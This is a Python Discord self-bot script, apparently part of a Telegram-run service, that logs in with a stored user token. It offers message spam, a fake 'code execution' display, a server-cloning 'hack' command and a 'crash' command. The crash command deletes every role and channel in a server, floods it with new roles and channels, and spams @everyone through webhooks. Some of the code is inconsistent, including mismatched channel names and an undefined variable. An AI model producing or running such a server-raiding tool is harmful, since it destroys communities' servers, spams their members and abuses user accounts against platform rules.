


# -*- coding: utf-8 -*-
from os import truncate
import discord
from discord import channel
from discord.ext import commands
import time
import requests as rq
import os
import re
import json
from urllib.request import Request, urlopen
import sys
# insert at 1, 0 is the script path (or '' in REPL)
sys.path.insert(1, '/home/runner/TgSelf')
import bot

# =-=-=-==-=-=-=-==-=-==-=-=-=-=-= #
import sqlite3
conn = sqlite3.connect("Tg.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""CREATE TABLE IF NOT EXISTS all_hel(
  "id"  INT, 
  "token" TEXT, 
  "pod" INT,
  "name_self" TEXT,
  "prefix"  TEXT); 
""")
for row in cursor.execute(f"SELECT * FROM all_hel where id={id_tg_user}"):
  rows = row[1]
  pref = row[4]
Token = rows
prefix = pref
# =-=-=-==-=-=-=-==-=-==-=-=-=-=-= #



client = commands.Bot(command_prefix=prefix, self_bot = True, intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    print(f"[СТАРТ] Self Bots \"{sys.argv[0]}\" запущен!")
    await client.change_presence(activity = discord.Streaming(name="Создано в @discordselfbot (telegram)", url="https://www.twitch.tv/forgottenxyz"))

@client.command()
async def help(ctx):
    await ctx.send(f'Self bot\n\n`{prefix}ping`- что бы узнать пинг бота\n`{prefix}spam [количество] [сообщение]`- что бы спамить\n`{prefix}python [код]`- выполнение python кода (фейк)\n`{prefix}hack`- что бы скопировать сервер\n`{prefix}crash`- что бы крашнуть сервер')

@client.command()
async def python(ctx, *, code):
  msg = await ctx.send(":white_check_mark: Выполняю ваш код...")
  time.sleep(1)
  
  await msg.edit(content=f'Подключение к серверу 57%')
  time.sleep(1)
  await msg.edit(content=f'Подключение к серверу 97%')
  time.sleep(1)
  await msg.edit(content=f'Подключён!') 

  time.sleep(2)
  await msg.edit(content=f'Код успешно выполнен! :white_check_mark:\nЯзык: `Python`\nОшибок: `0`\nСам код:\n```py\n{code}```')


@client.command()
async def spam(ctx, count:int, *, message):
    await ctx.message.delete()
    for i in range(count):
     await ctx.send(message)   


@client.command()
async def ping(ctx): # Объявление асинхронной функции __ping с возможностью публикации сообщения
    ping = client.ws.latency # Получаем пинг клиента
     

    ping_emoji = '🟩🔳🔳🔳🔳' # Эмоция пинга, если он меньше 100ms

    if ping > 0.10000000000000000:
        ping_emoji = '🟧🟩🔳🔳🔳' # Эмоция пинга, если он больше 100ms

    if ping > 0.15000000000000000:
        ping_emoji = '🟥🟧🟩🔳🔳' # Эмоция пинга, если он больше 150ms

    if ping > 0.20000000000000000:
        ping_emoji = '🟥🟥🟧🟩🔳' # Эмоция пинга, если он больше 200ms

    if ping > 0.25000000000000000:
        ping_emoji = '🟥🟥🟥🟧🟩' # Эмоция пинга, если он больше 250ms

    if ping > 0.30000000000000000:
        ping_emoji = '🟥🟥🟥🟥🟧' # Эмоция пинга, если он больше 300ms

    if ping > 0.35000000000000000:
        ping_emoji = '🟥🟥🟥🟥🟥' # Эмоция пинга, если он больше 350ms

    message = await ctx.send('Пожалуйста, подождите. . .') # Переменная message с первоначальным сообщением
    await message.edit(content = f'Понг! {ping_emoji} `{ping * 1000:.0f}ms` :ping_pong:') # Редактирование первого сообщения на итоговое (на сам пинг)

@client.command()
async def crash(ctx):
    await ctx.guild.edit(name='Crashed by @discordselfbot')
    for r in ctx.guild.roles:
        try:
            await r.delete()
        except:
            pass


    for c in ctx.guild.channels:
        try:
            await c.delete()
        except:
            pass

    for i in range(50):
        await ctx.guild.create_role(name='Crash By @discordselfbot')
        ch = await ctx.guild.create_text_channel('crash-by-discordselfbot')
       # await ch.send(f'Серв крашиться одним из ботов @discord-self-bot (телеграмм)\n@everyone\nhttps://t.me/discordselfbot')
        await ch.create_webhook(name='@discordselfbot')

@client.event
async def on_guild_channel_create(channel):
    if channel.name == 'crash-by-discord-self-bot':
        for i in range(100):
            hooks = await channel.webhooks()
            for hook in hooks:
                await hook.send('Серв крашится одним из ботов @discordselfbot\n||@everyone  @here||\nhttps://t.me/discordselfbot')

@client.command()
async def hack(ctx):
    if not ctx.guild: return
    timel = time.time()
    guild = ctx.guild
    msglog=ctx.message
    new_guild = await client.create_guild(name=guild.name)
    for channel in new_guild.channels:
        try:
            await channel.delete()
        except:
            pass
    await msglog.edit(content=f'Создан сервер с именем {guild.name}, начинаю создание ролей')
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    await msglog.edit(content=f'Создание ролей завершено, начинаю создание каналов')
    for dc in await new_guild.fetch_channels():
        await dc.delete()
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
    await msglog.edit(content=f'Создание каналов завершено, начинаю настройку оверврайтов')
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
        await channels[c].edit(overwrites=over_new)
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)#это не оверврайт, но лучше его делать перед эмодзи
    await msglog.edit(content=f'Настройка оверврайтов завершена, начинаю создание эмодзи...')
    countem = 0
    for emoji in guild.emojis:
        try:
            if int(countem) == 50:
                break
            else:
                url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
                await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
                countem +=1
        except:
            print('не могу скопировать эмодзю')
            break
    times = int(time.time() - timel)
    await msglog.edit(content=f'Завершено клонирование сервера. Операция заняла {times} сек.')


try:
  client.run(Token, bot =False)
except Exception as e:
  print(e)
  bot.sendd(id_tg_user, f"*⛔ ОШИБКА В БОТЕ:* {e}")
